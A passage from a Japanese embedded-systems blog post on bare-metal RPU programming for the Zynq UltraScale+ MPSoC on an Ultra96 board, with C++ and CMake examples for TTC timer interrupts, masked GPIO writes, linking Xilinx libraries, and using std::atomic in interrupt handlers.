<span id="cb32-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb32-7" aria-hidden="true" tabindex="-1"></a>          <span class="op">&lt;</span><span class="bn">0x0</span> <span class="bn">0xff9900e0</span> <span class="bn">0x0</span> <span class="bn">0x20</span><span class="op">&gt;;</span> <span class="co">// APU -&gt; RPU0 response</span></span>
<span id="cb32-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb32-8" aria-hidden="true" tabindex="-1"></a>  <span class="op">};</span></span>
<span id="cb32-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb32-9" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span></code></pre></div>
<h3 id="l-チカを支える-ttc">L チカを支える TTC</h3>
<p>RPU から使えるタイマー・カウンターとして、LPD にある4つの Triple-timer counter (TTC) があります。今回はこのうちの1つを 10 Hz で割り込みが飛ぶようにして L チカのタイミング制御に使っています。</p>
<p>TTC は名前の通り、3つのカウンターを持つユニットです。それが4つあるので合計12個のカウンターがあることになります。<code>xparameters.h</code> では、1つ目の TTC が持つカウンターから順に <code>XPAR_PSU_TTC_0_*</code>, <code>XPAR_PSU_TTC_1_*</code>, …, <code>XPAR_PSU_TTC_12_*</code> と名前が付いています。ちょっとまぎらわしいので注意です。また XSCT で BSP を作ったときに出力されるメッセージや <code>xparameters.h</code> の記述にある通り、カウンターの1つは <code>sleep</code> などの実装に使われるようなので、実際に使えるカウンターは11個です。</p>
<pre><code>+generate-src | psu_ttc_3 will be used in sleep routines for delay generation</code></pre>
<p>今回は <code>xparameters.h</code> の <code>XPAR_PSU_TTC_0</code>、つまり TTC0 の1つ目のカウンターを使いました。10 Hz の Interval Mode で割り込みを設定するならこんな感じです。ちなみに、デバッグなどで実行中のアプリケーションを何度もロードし直すことも想定した場合、<code>XTtcPs_CfgInitialize()</code> の前にレジスタを直接操作するなどで TTC を無理やり無効化するなどの処理を入れるのがいいと思います。もしこのタイミングで TTC が動いていた場合、<a href="https://github.com/Xilinx/embeddedsw/blob/b3d8b420b421730ea505da55b42174dc90f885c1/XilinxProcessorIPLib/drivers/ttcps/src/xttcps.c#L121-L127"><code>XTtcPs_CfgInitialize()</code> がエラーを返してしまう</a>ためです。</p>
<div class="sourceCode" id="cb34"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb34-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="at">static</span> <span class="dt">void</span> ttc_irq_handler<span class="op">(</span><span class="dt">void</span><span class="op">*</span> data<span class="op">)</span> <span class="kw">noexcept</span> <span class="op">{</span></span>
<span id="cb34-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">auto</span> ttc <span class="op">=</span> <span class="kw">static_cast</span><span class="op">&lt;</span>XTtcPs<span class="op">*&gt;(</span>data<span class="op">);</span></span>
<span id="cb34-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">const</span> <span class="kw">auto</span> status <span class="op">=</span> XTtcPs_GetInterruptStatus<span class="op">(</span>ttc<span class="op">);</span></span>
<span id="cb34-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-4" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>status <span class="op">&amp;</span> XTTCPS_IXR_INTERVAL_MASK<span class="op">)</span> <span class="op">{</span></span>
<span id="cb34-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-5" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ...</span></span>
<span id="cb34-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-7" aria-hidden="true" tabindex="-1"></a>    XTtcPs_ClearInterruptStatus<span class="op">(</span>ttc<span class="op">,</span> XTTCPS_IXR_INTERVAL_MASK<span class="op">);</span></span>
<span id="cb34-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-8" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb34-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-9" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb34-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-12" aria-hidden="true" tabindex="-1"></a>XTtcPs ttc<span class="op">{};</span></span>
<span id="cb34-13"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-13" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb34-14"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-14" aria-hidden="true" tabindex="-1"></a>  <span class="kw">auto</span> cfg <span class="op">=</span> XTtcPs_LookupConfig<span class="op">(</span>XPAR_PSU_TTC_0_DEVICE_ID<span class="op">);</span></span>
<span id="cb34-15"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-15" aria-hidden="true" tabindex="-1"></a>  XTtcPs_CfgInitialize<span class="op">(&amp;</span>ttc<span class="op">,</span> cfg<span class="op">,</span> cfg<span class="op">-&gt;</span>BaseAddress<span class="op">);</span></span>
<span id="cb34-16"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-17"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-17" aria-hidden="true" tabindex="-1"></a>  XTtcPs_SetOptions<span class="op">(&amp;</span>ttc<span class="op">,</span> XTTCPS_OPTION_INTERVAL_MODE <span class="op">|</span> XTTCPS_OPTION_WAVE_DISABLE<span class="op">);</span></span>
<span id="cb34-18"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-19"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-19" aria-hidden="true" tabindex="-1"></a>  XInterval interval<span class="op">;</span></span>
<span id="cb34-20"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-20" aria-hidden="true" tabindex="-1"></a>  <span class="bu">std::</span>uint8_t<span class="op"> </span>prescaler<span class="op">;</span></span>
<span id="cb34-21"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-21" aria-hidden="true" tabindex="-1"></a>  XTtcPs_CalcIntervalFromFreq<span class="op">(&amp;</span>ttc<span class="op">,</span> <span class="dv">10</span><span class="op">,</span> <span class="op">&amp;</span>interval<span class="op">,</span> <span class="op">&amp;</span>prescaler<span class="op">);</span> <span class="co">// 10 Hz</span></span>
<span id="cb34-22"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-22" aria-hidden="true" tabindex="-1"></a>  XTtcPs_SetInterval<span class="op">(&amp;</span>ttc<span class="op">,</span> interval<span class="op">);</span></span>
<span id="cb34-23"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-23" aria-hidden="true" tabindex="-1"></a>  XTtcPs_SetPrescaler<span class="op">(&amp;</span>ttc<span class="op">,</span> prescaler<span class="op">);</span></span>
<span id="cb34-24"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-25"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-25" aria-hidden="true" tabindex="-1"></a>  XTtcPs_EnableInterrupts<span class="op">(&amp;</span>ttc<span class="op">,</span> XTTCPS_IXR_INTERVAL_MASK<span class="op">);</span></span>
<span id="cb34-26"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-26" aria-hidden="true" tabindex="-1"></a>  XTtcPs_ClearInterruptStatus<span class="op">(&amp;</span>ttc<span class="op">,</span> XTTCPS_IXR_ALL_MASK<span class="op">);</span></span>
<span id="cb34-27"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-27" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-28"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-28" aria-hidden="true" tabindex="-1"></a>  XScuGic_Connect<span class="op">(&amp;</span>gic<span class="op">,</span> XPAR_PSU_TTC_0_INTR<span class="op">,</span> ttc_irq_handler<span class="op">,</span> <span class="op">&amp;</span>ttc<span class="op">);</span></span>
<span id="cb34-29"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-29" aria-hidden="true" tabindex="-1"></a>  XScuGic_Enable<span class="op">(&amp;</span>gic<span class="op">,</span> XPAR_PSU_TTC_0_INTR<span class="op">);</span></span>
<span id="cb34-30"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb34-30" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<h3 id="ps-gpio-の任意の複数ピンを同時に扱う">PS GPIO の任意の複数ピンを同時に扱う</h3>
<p>ほかに RPU から使っているのは GPIO です。Ultra96 の LED は <code>PS_MIO{17, ..., 20}</code> につながっているので <code>XGpioPs</code> を使います。</p>
<p>GPIO の操作というと、ピン単位かポートやバンクなどと呼ばれるまとまった単位で操作するのが一般的だと思います。<code>XGpioPs</code> も、<code>XGpioPs_Read()</code>, <code>XGpioPs_Write()</code> などバンク単位での操作と、<code>XGpioPs_ReadPin()</code>, <code>XGpioPs_WritePin()</code> などピン単位の操作が C の関数として定義されています。LED 4つを一度に操作するなら、ちょうどそれらが同じバンクにあるので、例えばこんな感じにかけそうです。</p>
<div class="sourceCode" id="cb35"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb35-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="kw">inline</span> <span class="kw">constexpr</span> <span class="bu">std::</span>uint32_t<span class="op"> </span>GPIO_BANK0_LED_MASK <span class="op">=</span> <span class="bu">std::</span>uint32_t<span class="op">{</span><span class="bn">0b1111</span><span class="op">}</span> <span class="op">&lt;&lt;</span> <span class="dv">17</span><span class="op">;</span></span>
<span id="cb35-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb35-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb35-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb35-3" aria-hidden="true" tabindex="-1"></a><span class="kw">inline</span> <span class="dt">void</span> set_ultra96_leds<span class="op">(</span>XGpioPs<span class="op">&amp;</span> gpio<span class="op">,</span> <span class="bu">std::</span>uint8_t<span class="op"> </span>value<span class="op">)</span> <span class="kw">noexcept</span> <span class="op">{</span></span>
<span id="cb35-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb35-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">const</span> <span class="kw">auto</span> r <span class="op">=</span> XGpioPs_Read<span class="op">(&amp;</span>gpio<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
<span id="cb35-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb35-5" aria-hidden="true" tabindex="-1"></a>  XGpioPs_Write<span class="op">(&amp;</span>gpio<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="op">(</span>r <span class="op">&amp;</span> <span class="op">~</span>GPIO_BANK0_LED_MASK<span class="op">)</span> <span class="op">|</span> <span class="op">((</span>value <span class="op">*</span> <span class="bn">0b1111</span><span class="op">)</span> <span class="op">&lt;&lt;</span> <span class="dv">17</span><span class="op">));</span></span>
<span id="cb35-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb35-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>しかし、これだと一度 GPIO の値を読み出しているのがなんだかもにょっとします。また、<code>XGpioPs_Write()</code> がそのバンク全体に影響する操作なのもちょっとこわいです。特に APU で動いている Linux も GPIO を触れる状況にあるので、(実際に bank 0 を使うものはいないはずですが) 互いの処理の実行され方によっては整合性が取れなくなってしまうかもしれません。もちろん、そんな状況が想定される設計にしないに越したことはありませんが、いずれにせよ Zynq という同じメモリ空間を複数のプロセッサなどが共有している環境では注意しておくべきです<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fn8" class="footnote-ref" id="fnref8" role="doc-noteref"><sup>8</sup></a>。</p>
<p>どうしたものかと TRM などを眺めていると、<code>MASK_DATA_{LSW,MSW}</code> というレジスタがあるのに気づきます。これは各バンクに属する下 16 bit・上 10 bit に対し、一度にビットマスクとデータを渡すことで特定のピンだけの出力を指定できるようです。まさに探していたものですね。<code>PS_MIO{17, ..., 20}</code> は bank 0 の上位10 bit の枠になるので、<code>MASK_DATA_0_MSW</code> に対してこんな感じにしてやればいいですね。</p>
<div class="sourceCode" id="cb36"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb36-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="kw">inline</span> <span class="kw">constexpr</span> <span class="bu">std::</span>uint32_t<span class="op"> </span>GPIO_BANK0_LED_MASK <span class="op">=</span> <span class="bu">std::</span>uint32_t<span class="op">{</span><span class="bn">0b1111</span><span class="op">}</span> <span class="op">&lt;&lt;</span> <span class="dv">17</span><span class="op">;</span></span>
<span id="cb36-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb36-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="kw">inline</span> <span class="dt">void</span> set_ultra96_leds<span class="op">(</span>XGpioPs<span class="op">&amp;</span> gpio<span class="op">,</span> <span class="bu">std::</span>uint8_t<span class="op"> </span>value<span class="op">)</span> <span class="kw">noexcept</span> <span class="op">{</span></span>
<span id="cb36-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb36-4" aria-hidden="true" tabindex="-1"></a>  XGpioPs_WriteReg<span class="op">(</span></span>
<span id="cb36-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb36-5" aria-hidden="true" tabindex="-1"></a>    gpio<span class="op">.</span>GpioConfig<span class="op">.</span>BaseAddr<span class="op">,</span> XGPIOPS_DATA_MSW_OFFSET<span class="op">,</span></span>
<span id="cb36-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb36-6" aria-hidden="true" tabindex="-1"></a>    <span class="co">// MASK_DATA_0_MSW の上位 16 bit はマスク</span></span>
<span id="cb36-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb36-7" aria-hidden="true" tabindex="-1"></a>    <span class="co">// `PS_MIO{17, ..., 20}` 以外に対応するものを 1 にする</span></span>
<span id="cb36-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb36-8" aria-hidden="true" tabindex="-1"></a>    <span class="op">(~</span>GPIO_BANK0_LED_MASK <span class="op">&amp;</span> <span class="bn">0xffff0000</span><span class="op">)</span> <span class="op">|</span></span>
<span id="cb36-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb36-9" aria-hidden="true" tabindex="-1"></a>    <span class="co">// `PS_MIO{17, ..., 20}` に設定する値</span></span>
<span id="cb36-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb36-10" aria-hidden="true" tabindex="-1"></a>    <span class="op">((</span>value <span class="op">&amp;</span> <span class="bn">0b1111</span><span class="op">)</span> <span class="op">&lt;&lt;</span> <span class="dv">1</span><span class="op">)</span></span>
<span id="cb36-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb36-11" aria-hidden="true" tabindex="-1"></a>  <span class="op">);</span></span>
<span id="cb36-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb36-12" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<h3 id="vitis-で作ったベアメタルアプリケーションを-cmake-でビルドする">Vitis で作ったベアメタルアプリケーションを CMake でビルドする</h3>
<p>上でちょろっと紹介したように、RPU 側アプリケーションの実装は Vitis で作った Appication Project からファイルを持ってきた上で CMake でビルドできるようにしたものです。<code>main.cc</code> 1つだけにわざわざ CMake を使わなくてよいですが、これをテンプレート的に別プロジェクトで使いまわすことを想定してのものです。</p>
<p>embeddedsw で提供されるいろいろを使うには、<code>libxil.a</code> などをリンクしなければいけません。<code>libxil.a</code> の検出とコンパイル・リンクのために、少々雑ではありますが <code>FindLibXil.cmake</code> を書きました。standalone 以外のライブラリも <code>find_package()</code> の <code>COMPONENTS</code> で指定できるようになっています。各ライブラリに対応するターゲットは、<code>add_library(LibXil::standalone INTERFACE IMPORTED)</code> のように <code>INTERFACE IMPORTED</code> で宣言しています。よくある <code>STATIC</code> や <code>UNKNOWN</code> でなく <code>INTERFACE</code> なのは、これらを単に <code>-l&lt;ほげほげ&gt;</code> でリンクできず、<code>--start-group,...,--end-group</code> でリンク順を明示してやらないといけないためです。続く <code>set_target_properties()</code> でそうしたリンクオプションを指定しています。</p>
<div class="sourceCode" id="cb37"><pre class="sourceCode cmake"><code class="sourceCode cmake"><span id="cb37-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="kw">if</span>(<span class="dv">LibXil_standalone_FOUND</span> <span class="ot">AND</span> <span class="ot">NOT</span> <span class="ot">TARGET</span> <span class="bn">LibXil::standalone</span>)</span>
<span id="cb37-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb37-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">add_library</span>(<span class="bn">LibXil::standalone</span> <span class="ot">INTERFACE</span> <span class="ot">IMPORTED</span>)</span>
<span id="cb37-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb37-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">set_target_properties</span>(<span class="bn">LibXil::standalone</span> <span class="ot">PROPERTIES</span></span>
<span id="cb37-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb37-4" aria-hidden="true" tabindex="-1"></a>    <span class="ot">INTERFACE_LINK_LIBRARIES</span> <span class="st">&quot;-Wl,--start-group,</span><span class="dv">${standalone_lib}</span><span class="st">,-lgcc,-lc,-lstdc++,--end-group&quot;</span></span>
<span id="cb37-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb37-5" aria-hidden="true" tabindex="-1"></a>    <span class="ot">INTERFACE_INCLUDE_DIRECTORIES</span> <span class="st">&quot;</span><span class="dv">${standalone_include}</span><span class="st">&quot;</span>)</span>
<span id="cb37-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb37-6" aria-hidden="true" tabindex="-1"></a><span class="kw">endif</span>()</span></code></pre></div>
<p>ちなみに、各ライブラリをどの順でリンクすればいいのかは、embeddedsw の <code>.mld</code> ファイルで <code>OPTION APP_LINKER_FLAGS</code> を見ればよいです。例えば xilffs なら<a href="https://github.com/Xilinx/embeddedsw/blob/b3d8b420b421730ea505da55b42174dc90f885c1/lib/sw_services/xilffs/data/xilffs.mld#L22">こんな行</a>があるのを見つけられると思います。</p>
<div class="sourceCode" id="cb38"><pre class="sourceCode tcl"><code class="sourceCode tcl"><span id="cb38-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb38-1" aria-hidden="true" tabindex="-1"></a>OPTION APP_LINKER_FLAGS = <span class="st">&quot;-Wl,--start-group,-lxilffs,-lxil,-lgcc,-lc,--end-group&quot;</span>;</span></code></pre></div>
<h3 id="isr-で-atomic-使うのって実際どうなの">ISR で atomic 使うのって実際どうなの</h3>
<p>割り込みハンドラーにたくさん実装を入れたくないので、「割り込みがあったかどうかのフラグ」を立てるなど最低限の処理だけにして、実際の処理はメインループの中でやる、という実装をしています。こうした「割り込みがあったかどうかのフラグ」などの割り込みハンドラーと共有する値は、コンパイラが意図しない最適化をしてしまわないように何かしらの対策をするのが一般的です。その値がコンパイラから見てどこか別のところから書き換えられることのない定数のように見えたとしても、実際には突発的に呼び出される割り込みハンドラーから書き換えられる可能性がるからコードの意味を変えないでね、と伝えてやるイメージです。</p>
<p>C/C++ の組み込みプログラミングでよく使われるのが <code>volatile</code> です。ただ <code>volatile</code> が何者なのか正直よくわからず、なんだか「とりあえず <code>volatile</code> 付けておけば安心！」に見えてしまうのでうーんです。その代替手段として <a href="https://en.cppreference.com/w/cpp/header/atomic"><code>&lt;atomic&gt;</code></a> を試してみています。</p>
<p>一番単純な例が TTC 割り込みの部分です。<a href="https://en.cppreference.com/w/cpp/atomic/atomic_flag"><code>std::atomic_flag</code></a> を使い、set を割り込み待ちの状態、clear を割り込みが起きた状態とします。メインループの中で <a href="https://en.cppreference.com/w/cpp/atomic/atomic_flag/test_and_set"><code>test_and_set()</code></a> を呼び出し、その時点での値が clear された状態 (<code>false</code>) だったら割り込みに対する処理、という感じです。</p>
<div class="sourceCode" id="cb39"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb39-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="at">static</span> <span class="bu">std::</span>atomic_flag<span class="op"> </span>ttc_irq_kicked_n <span class="op">=</span> ATOMIC_FLAG_INIT<span class="op">;</span></span>
<span id="cb39-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-3" aria-hidden="true" tabindex="-1"></a><span class="at">static</span> <span class="dt">void</span> ttc_irq_handler<span class="op">(</span><span class="dt">void</span><span class="op">*</span> data<span class="op">)</span> <span class="kw">noexcept</span> <span class="op">{</span></span>
<span id="cb39-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-4" aria-hidden="true" tabindex="-1"></a>  <span class="kw">auto</span> ttc <span class="op">=</span> <span class="kw">static_cast</span><span class="op">&lt;</span>XTtcPs<span class="op">*&gt;(</span>data<span class="op">);</span></span>
<span id="cb39-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-5" aria-hidden="true" tabindex="-1"></a>  <span class="at">const</span> <span class="kw">auto</span> status <span class="op">=</span> XTtcPs_GetInterruptStatus<span class="op">(</span>ttc<span class="op">);</span></span>
<span id="cb39-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-6" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>status <span class="op">&amp;</span> XTTCPS_IXR_INTERVAL_MASK<span class="op">)</span> <span class="op">{</span></span>
<span id="cb39-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-7" aria-hidden="true" tabindex="-1"></a>    ttc_irq_kicked_n<span class="op">.</span>clear<span class="op">(</span><span class="bu">std::</span>memory_order_relaxed<span class="op">);</span></span>
<span id="cb39-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-9" aria-hidden="true" tabindex="-1"></a>    XTtcPs_ClearInterruptStatus<span class="op">(</span>ttc<span class="op">,</span> XTTCPS_IXR_INTERVAL_MASK<span class="op">);</span></span>
<span id="cb39-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-10" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb39-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-11" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb39-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-13"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-13" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> <span class="op">(;;)</span> <span class="op">{</span></span>
<span id="cb39-14"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-14" aria-hidden="true" tabindex="-1"></a>  <span class="kw">asm</span> <span class="at">volatile</span><span class="op">(</span><span class="st">&quot;wfi&quot;</span><span class="op">);</span></span>
<span id="cb39-15"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-16"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-16" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(!</span>ttc_irq_kicked_n<span class="op">.</span>test_and_set<span class="op">(</span><span class="bu">std::</span>memory_order_relaxed<span class="op">))</span> <span class="op">{</span></span>
<span id="cb39-17"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-17" aria-hidden="true" tabindex="-1"></a>    <span class="co">// TTC 割り込みがあったときの処理</span></span>
<span id="cb39-18"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-18" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb39-19"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb39-19" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>IPI 割り込みでは <a href="https://en.cppreference.com/w/cpp/atomic/atomic"><code>std::atomic&lt;std::uint32_t&gt;</code></a> を使って Message Buffer から読み込んだ値を渡す目的も兼ねています。最上位ビットを割り込みが起きた状態かどうかに、残りを Message Buffer から呼んだ値とします。メインループでは <a href="https://en.cppreference.com/w/cpp/atomic/atomic/exchange"><code>exchange()</code></a> を呼び出して値を 0 に置き換えつつ、その時点での値の最上位ビットが立っていたら割り込みに対する処理、という感じです。</p>
<div class="sourceCode" id="cb40"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb40-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="at">static</span> <span class="bu">std::</span>atomic<span class="op">&lt;</span><span class="bu">std::</span>uint32_t<span class="op">&gt;</span> ipi_req<span class="op">{</span><span class="dv">0</span><span class="op">};</span></span>
<span id="cb40-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-3" aria-hidden="true" tabindex="-1"></a><span class="at">static</span> <span class="dt">void</span> ipi_irq_handler<span class="op">(</span><span class="dt">void</span><span class="op">*</span> data<span class="op">)</span> <span class="kw">noexcept</span> <span class="op">{</span></span>
<span id="cb40-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-4" aria-hidden="true" tabindex="-1"></a>  <span class="kw">auto</span> ipi <span class="op">=</span> <span class="kw">static_cast</span><span class="op">&lt;</span>XIpiPsu<span class="op">*&gt;(</span>data<span class="op">);</span></span>
<span id="cb40-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-5" aria-hidden="true" tabindex="-1"></a>  <span class="at">const</span> <span class="kw">auto</span> status <span class="op">=</span> XIpiPsu_GetInterruptStatus<span class="op">(</span>ipi<span class="op">);</span></span>
<span id="cb40-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-6" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>status <span class="op">&amp;</span> IPI_TRIG_CH7_MASK<span class="op">)</span> <span class="op">{</span></span>
<span id="cb40-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-7" aria-hidden="true" tabindex="-1"></a>    <span class="at">const</span> <span class="bu">std::</span>uint32_t<span class="op"> </span>req <span class="op">=</span> Xil_In32<span class="op">(</span>XPAR_PSU_MESSAGE_BUFFERS_S_AXI_BASEADDR <span class="op">+</span> <span class="bn">0x600</span><span class="op">);</span></span>
<span id="cb40-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-8" aria-hidden="true" tabindex="-1"></a>    ipi_req<span class="op">.</span>store<span class="op">(</span>req <span class="op">|</span> <span class="bn">0x8000'0000</span><span class="op">,</span> <span class="bu">std::</span>memory_order_relaxed<span class="op">);</span></span>
<span id="cb40-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-10" aria-hidden="true" tabindex="-1"></a>    XIpiPsu_ClearInterruptStatus<span class="op">(</span>ipi<span class="op">,</span> IPI_TRIG_CH7_MASK<span class="op">);</span></span>
